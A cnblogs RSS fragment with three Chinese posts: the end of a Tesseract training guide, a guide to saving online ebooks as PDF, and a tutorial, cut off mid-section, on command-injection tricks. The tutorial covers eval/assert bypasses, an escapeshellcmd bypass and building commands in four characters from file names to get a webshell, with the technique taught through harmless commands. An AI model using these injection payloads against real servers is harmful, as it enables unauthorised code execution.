&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223718886-963218633.png&quot;/&gt;&lt;br/&gt;随后再打开jTessBoxEditor，点击Box Editor，加载tif文件&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223735323-1668182594.png&quot;/&gt;&lt;br/&gt;针对生成的结果进行文字的重新编辑和调整。然后在图片目录下创建一个font_properties的字体文件，里面的内容为：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;cat font_properties 
font 0 0 0 0 0&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223822577-690819119.png&quot;/&gt;&lt;br/&gt;然后执行重新训练脚本，脚本的内容为：&lt;/p&gt;
&lt;pre class=&quot;sh&quot;&gt;
&lt;code&gt;echo &quot;训练&quot;
tesseract tg.font.exp0.tif tg.font.exp0 nobatch box.train

echo &quot;生成字符集&quot;
unicharset_extractor tg.font.exp0.box

mftraining -F font_properties -U unicharset -O tg.unicharset tg.font.exp0.tr

echo &quot;聚类&quot;
cntraining tg.font.exp0.tr

echo &quot;重命名&quot;
cp normproto tg.normproto 
cp inttemp tg.inttemp 
cp pffmtable tg.pffmtable 
cp shapetable tg.shapetable 
cp unicharset tg.unicharset

echo &quot;创建tessdata&quot;
combine_tessdata tg.

echo &quot;拷贝traineddata&quot;
cp tg.traineddata /usr/local/Cellar/tesseract/3.05.02/share/tessdata/tg.traineddata&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223851112-1648089356.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223900088-1363391222.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后重新进行文字识别，可以看到刚才识别错误的 “辑”字正确了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223916427-1684738017.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;本地搭建好tesseract，可以使用一些第三方的工具包来调用，还是很方便的。&lt;/p&gt;
</description>
<pubDate>Thu, 09 Aug 2018 14:44:00 +0000</pubDate>
<dc:creator>xingoo</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xing901022/p/9452335.html</dc:identifier>
</item>
<item>
<title>如何将在线电子书保存为pdf格式 - 开发之路</title>
<link>http://www.cnblogs.com/kevin2chen/p/9452311.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kevin2chen/p/9452311.html</guid>
<description>&lt;p&gt;　　网上有很多免费的在线电子书籍，没有pdf格式，不方便离线阅读，也不方便做记录，所以找了几个将在线内容制作成pdf文件的方法。&lt;/p&gt;
&lt;p&gt;一、如果网站上的书籍内容没有分页，所有内容都直接显示出来了，最简单，直接将打印机设为PDF即可：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1094158/201808/1094158-20180809220633920-1131121658.png&quot; alt=&quot;&quot; width=&quot;988&quot; height=&quot;276&quot;/&gt;&lt;/p&gt;

&lt;p&gt;二、书籍内容分章节显示，需要点击链接重新请求数据切换的：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;利用 teleport 软件将整个站点导出到本地。&lt;/li&gt;
&lt;li&gt;利用 http-server（任意语言皆可）将上述站点起个本地服务。&lt;/li&gt;
&lt;li&gt;安装adobe acrobat DC，它内置了浏览器内核，可以将前端代码直接渲染成pdf格式。使用细节参考--&amp;gt; &lt;a href=&quot;https://helpx.adobe.com/cn/acrobat/using/converting-web-pages-pdf.html&quot; target=&quot;_blank&quot;&gt;adobe 用户指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;通过adobe acrobat的 converting-web-pages-pdf 功能将上述网站导出为pdf格式文件：&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1094158/201808/1094158-20180809222550046-1824564789.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;div&gt;
&lt;p&gt;　　注意事项：&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;  　 1.文件路径不能是中文，否则除了新建时输入的url能解析外，后续的url都解析错误，导致找不到文件，如下错误信息：&lt;/p&gt;



&lt;div readability=&quot;8&quot;&gt;
&lt;p&gt;　　　　2.overflow：hidden部分不能被完整导出，需要勾选展开可滚动的块选项：&lt;/p&gt;
&lt;div&gt;&lt;img class=&quot;en-media en-media-image&quot; alt=&quot;&quot; data-filename=&quot;&quot; data-reference=&quot;resource-0&quot; data-type=&quot;image/png&quot; data-url=&quot;en-resource://database/635:0&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1094158/201808/1094158-20180809221106501-1932618662.png&quot; alt=&quot;&quot; width=&quot;403&quot; height=&quot;550&quot;/&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div readability=&quot;14&quot;&gt;
&lt;p&gt;　　　　3.如果线上页面有不需要的部分，如广告，弹框，或者页面每章节都出现的导航栏，可以通过修改本地站点的css源码将其隐藏。&lt;/p&gt;
&lt;p&gt;　　　　4.章节的顺序：acrobat按照站点下资源的html文件名顺序将整个站点导出。如果章节顺序不对，可以自行修改文件名。文件名不重要，顺序对就可以。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1094158/201808/1094158-20180809223004076-1632040625.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过上述步骤，顺利导出了好几本在线电子书籍&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1094158/201808/1094158-20180809223306311-553553217.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;/div&gt;
</description>
<pubDate>Thu, 09 Aug 2018 14:39:00 +0000</pubDate>
<dc:creator>开发之路</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kevin2chen/p/9452311.html</dc:identifier>
</item>
<item>
<title>如何在命令长度受限的情况下成功get到webshell(函数参数受限突破、mysql的骚操作) - Angel_Kitty</title>
<link>http://www.cnblogs.com/ECJTUACM-873284962/p/9452263.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ECJTUACM-873284962/p/9452263.html</guid>
<description>&lt;p&gt;还记得上篇文章&lt;a id=&quot;cb_post_title_url&quot; class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html&quot;&gt;记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)&lt;/a&gt;，我们讲到了一些PHP的一些如何巧妙地绕过数字和字母受限的技巧，今天我要给大家分享的是如何在命令长度受限的情况下成功get到webshell，以及关于函数参数受限的突破，mysql的一些骚操作技巧~~~&lt;/p&gt;

&lt;p&gt;我们先看个例子：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;$param&lt;/span&gt; = &lt;span&gt;$_REGUEST&lt;/span&gt;['param'&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$param&lt;/span&gt;) &amp;lt; 17&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;eval&lt;/span&gt;(&lt;span&gt;$param&lt;/span&gt;&lt;span&gt;);
    }
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上面这部分意思只是叫我们绕过长度受限就可以执行代码。这个其实就很简单了，我们可以采用调用&lt;strong&gt;eval&lt;/strong&gt;或者&lt;strong&gt;assert&lt;/strong&gt;这种后门函数就可以直接绕过了~~&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;eval&lt;/strong&gt;函数中参数是字符，比如像下面这样子：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&lt;span&gt;eval&lt;/span&gt;('echo 1;');
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;assert&lt;/strong&gt;函数中参数为表达式(或者为函数)，我们可以像下面这样子去实现：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&lt;span&gt;assert&lt;/span&gt;(&lt;span&gt;phpinfo&lt;/span&gt;()) 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;而我参看了PHP手册才了解到，&lt;strong&gt;assert&lt;/strong&gt;是函数，&lt;strong&gt;eval&lt;/strong&gt;不是函数，是一种语言构造器，&lt;strong&gt;eval($a)&lt;/strong&gt;中&lt;strong&gt;$a&lt;/strong&gt;只能是字符串，&lt;strong&gt;assert($a)&lt;/strong&gt;中&lt;strong&gt;$a&lt;/strong&gt;可以是php代码，也可以是php代码的字符串。&lt;strong&gt;assert($a)&lt;/strong&gt;的&lt;strong&gt;$a&lt;/strong&gt;如果是字符串形式不能有2个以上的分号,如果有2个以上的分号只执行到第一个，使用&lt;strong&gt;assert&lt;/strong&gt;来执行多条php语句可借助eval来实现。&lt;/p&gt;
&lt;p&gt;例如像下面这个样子：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;assert&lt;/span&gt;(&lt;span&gt;eval&lt;/span&gt;(&quot;echo 1;echo 2;&quot;));
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809083749058-1219589602.png&quot; alt=&quot;&quot; width=&quot;364&quot; height=&quot;73&quot;/&gt;&lt;/p&gt;
&lt;p&gt;比如像上面这句，如果是&lt;strong&gt;assert(eval(&quot;echo 1;echo 2&quot;))&lt;/strong&gt;，这样写是不会执行&lt;strong&gt;echo 1&lt;/strong&gt;也不会执行&lt;strong&gt;echo 2&lt;/strong&gt;的,因为eval使用的字符串要是有分号的php语句，只要有字符串，它就可以当作命令来执行~~&lt;/p&gt;
&lt;p&gt;更多细节我们可以参看PHP手册：&lt;/p&gt;
&lt;p&gt;eval函数：&lt;a href=&quot;http://www.php.net/manual/zh/function.eval.php&quot;&gt;http://www.php.net/manual/zh/function.eval.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;assert函数：&lt;a href=&quot;http://php.net/manual/zh/function.assert.php&quot; target=&quot;_blank&quot;&gt;http://php.net/manual/zh/function.assert.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;那如果像下面这个例子呢？&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;$param&lt;/span&gt; = &lt;span&gt;$_REGUEST&lt;/span&gt;['param'&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;(
        &lt;/span&gt;&lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$param&lt;/span&gt;) &amp;lt; 17 &amp;amp;&amp;amp;
        &lt;span&gt;stripos&lt;/span&gt;(&lt;span&gt;$param&lt;/span&gt;, 'eval') == &lt;span&gt;false&lt;/span&gt; &amp;amp;&amp;amp;
        &lt;span&gt;stripos&lt;/span&gt;(&lt;span&gt;$param&lt;/span&gt;, 'assert') == &lt;span&gt;false&lt;/span&gt;&lt;span&gt;
    ){
        &lt;/span&gt;&lt;span&gt;eval&lt;/span&gt;(&lt;span&gt;$param&lt;/span&gt;&lt;span&gt;);
    }
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;striops函数是用来查找目标字符串在字符串中第一次出现的位置。这里的意思是限制了长度最长为 16 个字符，而且不能用 &lt;strong&gt;eval&lt;/strong&gt; 或 &lt;strong&gt;assert&lt;/strong&gt;，这样我们又该怎么执行命令。&lt;/p&gt;
&lt;p&gt;我们可以通过命令执行来绕过限制：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
param=`&lt;span&gt;$_GET&lt;/span&gt;[1]`;&amp;amp;1=bash
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;当然了，我们也可以用 exec函数：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
param=&lt;span&gt;exec&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;[1]);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;exec&lt;/strong&gt;可以执行一个外部程序，具体的可以参看PHP手册：&lt;a href=&quot;http://php.net/manual/zh/function.exec.php&quot; target=&quot;_blank&quot;&gt;http://php.net/manual/zh/function.exec.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;那如果是这个呢？&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;$command&lt;/span&gt; = 'dir '.&lt;span&gt;$_POST&lt;/span&gt;['dir'&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;$escaped_command&lt;/span&gt; = &lt;span&gt;escapeshellcmd&lt;/span&gt;(&lt;span&gt;$command&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;var_dump&lt;/span&gt;(&lt;span&gt;$escaped_command&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;file_put_contents&lt;/span&gt;('out.bat',&lt;span&gt;$escaped_command&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;system&lt;/span&gt;('out.bat'&lt;span&gt;);
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们对其进行测试：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809130103631-19775422.png&quot; alt=&quot;&quot; width=&quot;515&quot; height=&quot;258&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们应该如何去绕过呢？&lt;/p&gt;
&lt;p&gt;我们来看看这些函数，&lt;strong&gt;escapeshellcmd()&lt;/strong&gt; 函数对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 &lt;strong&gt;exec()&lt;/strong&gt; 或 &lt;strong&gt;system()&lt;/strong&gt; 函数，或者执行操作符之前进行转义。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;escapeshellcmd()&lt;/strong&gt; 函数的详细用法参看PHP手册：&lt;a href=&quot;http://php.net/manual/zh/function.escapeshellcmd.php&quot;&gt;http://php.net/manual/zh/function.escapeshellcmd.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;那么这个函数具体会转义哪些字符呢？&lt;/p&gt;
&lt;p&gt;我们通读了源码可以知道，下图这些字符都可以用^来取代其意义。也就是没办法用&amp;amp; | 来执行其他命令，只能列目录&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809130618614-1919258182.png&quot; alt=&quot;&quot; width=&quot;799&quot; height=&quot;447&quot;/&gt;&lt;/p&gt;
&lt;p&gt;感兴趣的同学可以研究一下源码，我把源码传到本地了：&lt;a href=&quot;https://files.cnblogs.com/files/ECJTUACM-873284962/exec.rar&quot; target=&quot;_blank&quot;&gt;https://files.cnblogs.com/files/ECJTUACM-873284962/exec.rar&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;那么我们萌生了一个这样的一个tips：执行.bat文件的时候，利用%1a，可以绕过过滤执行命令,我们做了如下尝试：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809131044342-1086127765.png&quot; alt=&quot;&quot; width=&quot;577&quot; height=&quot;237&quot;/&gt;&lt;/p&gt;
&lt;p&gt;前面我们已经说了如何限制在16个字符内的情况下拿到webshell，在二进制漏洞利用中，当我们遇到可控数据只有8字节的情况，去掉字符串尾的\0，限制在7个字符。那么在这种情况下，我们又该怎么办呢？&lt;/p&gt;
&lt;p&gt;还是看之前那个例子，把命令长度变成7。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;$param&lt;/span&gt; = &lt;span&gt;$_REGUEST&lt;/span&gt;['param'&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$param&lt;/span&gt;) &amp;lt; 8&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;eval&lt;/span&gt;(&lt;span&gt;$param&lt;/span&gt;&lt;span&gt;);
    }
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这让我想起赵本山演的那个小品《钟点工》里面的一个问题，把大象放进冰箱应该分为几步？&lt;/p&gt;
&lt;p&gt;此时我们需要铺垫一些基础知识了。&lt;/p&gt;
&lt;p&gt;我们可以进行命令的拼装。&lt;/p&gt;
&lt;p&gt;我们来个条件更加苛刻的问题，命令长度限制在5，如何完成注入，成功get到webshell呢？&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;$sandbox&lt;/span&gt; = '/www/sandbox/' . &lt;span&gt;md5&lt;/span&gt;(&quot;orange&quot; . &lt;span&gt;$_SERVER&lt;/span&gt;['REMOTE_ADDR'&lt;span&gt;]);
    @&lt;/span&gt;&lt;span&gt;mkdir&lt;/span&gt;(&lt;span&gt;$sandbox&lt;/span&gt;&lt;span&gt;);
    @&lt;/span&gt;&lt;span&gt;chdir&lt;/span&gt;(&lt;span&gt;$sandbox&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['cmd']) &amp;amp;&amp;amp; &lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['cmd']) &amp;lt;= 5&lt;span&gt;) {
        @&lt;/span&gt;&lt;span&gt;exec&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['cmd'&lt;span&gt;]);
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['reset'&lt;span&gt;])) {
        @&lt;/span&gt;&lt;span&gt;exec&lt;/span&gt;('/bin/rm -rf ' . &lt;span&gt;$sandbox&lt;/span&gt;&lt;span&gt;);
    }
    &lt;/span&gt;&lt;span&gt;highlight_file&lt;/span&gt;(&lt;span&gt;__FILE__&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;举个例子，我们要执行&lt;strong&gt;echo hello&lt;/strong&gt;这个命令，我们应该怎么办呢？&lt;/p&gt;
&lt;p&gt;我们可以进行如下构造：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&amp;gt;&lt;span&gt;echo&lt;/span&gt;
&amp;gt;hello
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809200810918-1988641876.png&quot; alt=&quot;&quot; width=&quot;348&quot; height=&quot;109&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们可以看到创建了两个文件，分别是echo和hello，我们执行*命令&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809200946218-1164863211.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们可以看到，执行了echo hello这行命令，所以直接打印出了hello字符串&lt;/p&gt;
&lt;p&gt;我们可以通过echo *来查看一下*里面的内容&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809201148020-1012569999.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们通过将&amp;gt;echo和&amp;gt;hello 完成命令拼接，然后用* 组成并执行了命令echo hello&lt;/p&gt;
&lt;p&gt;如果条件再苛刻一点呢？把命令长度限制在4，如何完成注入，成功get到webshell呢？&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;$sandbox&lt;/span&gt; = '/www/sandbox/' . &lt;span&gt;md5&lt;/span&gt;(&quot;orange&quot; . &lt;span&gt;$_SERVER&lt;/span&gt;['REMOTE_ADDR'&lt;span&gt;]);
    @&lt;/span&gt;&lt;span&gt;mkdir&lt;/span&gt;(&lt;span&gt;$sandbox&lt;/span&gt;&lt;span&gt;);
    @&lt;/span&gt;&lt;span&gt;chdir&lt;/span&gt;(&lt;span&gt;$sandbox&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['cmd']) &amp;amp;&amp;amp; &lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['cmd']) &amp;lt;= 4&lt;span&gt;) {
        @&lt;/span&gt;&lt;span&gt;exec&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['cmd'&lt;span&gt;]);
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['reset'&lt;span&gt;])) {
        @&lt;/span&gt;&lt;span&gt;exec&lt;/span&gt;('/bin/rm -rf ' . &lt;span&gt;$sandbox&lt;/span&gt;&lt;span&gt;);
    }
    &lt;/span&gt;&lt;span&gt;highlight_file&lt;/span&gt;(&lt;span&gt;__FILE__&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;比如，我们想要执行ls -l命令，我们可以模仿上面这种做法，进行如下构造：&lt;/p&gt;

&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809201758513-115742478.png&quot; alt=&quot;&quot; width=&quot;417&quot; height=&quot;152&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们可以看到创建了两个文件，分别是ls和-l，我们执行*命令&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809201942570-1162787061.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;诶，这咋回事啊，咋还报错了呢？&lt;/p&gt;
&lt;p&gt;其实啊，我们刚才生成的echo和hello，e的ASCII值要小于h，所以排序的时候自动将echo排在前面，hello排在后面，而&lt;strong&gt;ls&lt;/strong&gt;我们可以看到，此时文件的显示顺序是-l在ls的前面。如果我们执行* 其实是执行&lt;strong&gt;-l ls&lt;/strong&gt;会弹出报错信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809202144879-1881468484.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;那么我们又该如何获得&lt;strong&gt;&lt;em&gt;ls -l&lt;/em&gt;&lt;/strong&gt;呢？&lt;/p&gt;

&lt;h2&gt;01.命令内容反序&lt;/h2&gt;
&lt;p&gt;最简单的一种方式就是按照命令内容反着转过来。&lt;/p&gt;
&lt;p&gt;我们可以这个命令字符序列反过来看&lt;strong&gt; &lt;em&gt;l- sl，&lt;/em&gt;&lt;/strong&gt;这样是不是顺序正好满足要求呢？接下来我们只需要用一个可以把字符反过来的命令&lt;strong&gt;rev&lt;/strong&gt;，就可以完成这个功能&lt;/p&gt;
&lt;p&gt;所以首先第一步，我们先创建了两个文件，分别是&lt;strong&gt;l-&lt;/strong&gt;和&lt;strong&gt;sl。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809205955990-1216216720.png&quot; alt=&quot;&quot; width=&quot;281&quot; height=&quot;62&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;然后将&lt;strong&gt;l- sl&lt;/strong&gt;组合写入文件v，然后查看v文件里面的内容。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809210146704-858684567.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里面我们可以看到文件v中多了一个v，对我们命令造成干扰，如果我们只想文件中存在&lt;strong&gt;l-&lt;/strong&gt;和&lt;strong&gt;sl&lt;/strong&gt;，那该怎么办呢？&lt;/p&gt;
&lt;p&gt;这里有个小trick，&lt;strong&gt;dir a b&amp;gt;c&lt;/strong&gt;这个命令可以将a b写到文件c中，不会写入多余的命令进去。&lt;/p&gt;
&lt;p&gt;我们创建一个名为dir的文件，然后执行&lt;strong&gt;*&amp;gt;v&lt;/strong&gt;，可以获得&lt;strong&gt;l- &lt;/strong&gt;和&lt;strong&gt;ls&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&amp;gt;&lt;span&gt;dir&lt;/span&gt;
&lt;span&gt;echo&lt;/span&gt; *
*&amp;gt;&lt;span&gt;v
cat v&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809210814390-2041412435.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后我们就只需要对这个命令字符序列反转一下就行了，这里我们有一个rev命令，正好可以将内容反序。&lt;/p&gt;
&lt;p&gt;所以我们需要产生一个名为&lt;strong&gt;rev&lt;/strong&gt;的文件，然后执行&lt;strong&gt;&lt;em&gt;*v&lt;/em&gt; &lt;/strong&gt;，此时命令相当于&lt;strong&gt;&lt;em&gt;rev v&lt;/em&gt;&lt;/strong&gt;，命名为v是为了被通配符匹配，这样就产生了我们要的输出&lt;strong&gt;ls -l&lt;/strong&gt;。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&amp;gt;&lt;span&gt;rev
ls
&lt;/span&gt;*v
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809211241984-1408403188.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后就是输出到文件x，然后就可以执行&lt;strong&gt;&lt;em&gt;sh x&lt;/em&gt;&lt;/strong&gt;，成功以4个字符执行长度为5的ls -l命令。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
*v&amp;gt;&lt;span&gt;x
cat x
sh x&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180809211429528-841554071.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;把上面写的命令编成一个shell脚本如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;!/usr/bin/env bash&lt;/span&gt;
&amp;gt;l-
&amp;gt;&lt;span&gt;sl
&lt;/span&gt;&amp;gt;&lt;span&gt;dir&lt;/span&gt;
*&amp;gt;&lt;span&gt;v
&lt;/span&gt;&amp;gt;&lt;span&gt;rev
&lt;/span&gt;*v&amp;gt;&lt;span&gt;x
sh x&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们可以看到，整个命令链长度均小于等于4，这样我们就可以愉快的执行&lt;strong&gt;ls -l&lt;/strong&gt;命令了~&lt;/p&gt;
&lt;h2&gt;02.时间排序技巧&lt;/h2&gt;
&lt;p&gt;在ls命令里面有个参数-t，可以根据出现的时间进行排序，先生成的文件排在后面，后生成的文件排在前面，类似于栈的结构。&lt;/p&gt;
